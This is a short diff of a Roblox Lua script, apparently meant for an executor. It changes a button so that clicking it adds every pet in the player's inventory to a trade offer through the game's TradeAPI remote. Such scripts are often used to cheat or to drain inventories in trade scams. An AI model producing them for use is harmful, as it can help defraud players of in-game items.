@@ -8,10 +8,10 @@ local button = Instance.new("TextButton")
 button.Parent = gui -- Родительский объект кнопки (может быть изменен)
 button.Size = UDim2.new(0, 50, 0, 50) -- Размер кнопки
 button.Position = UDim2.new(0.5, 0, 0.5, -200) -- Позиция кнопки
-button.Text = "Gifts" -- Текст на кнопке
+button.Text = "Pets" -- Текст на кнопке
 button.MouseButton1Click:Connect(function()
 if not isClicked then
-  for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.gifts) do
+  for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
                                 
                                     ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
                                 
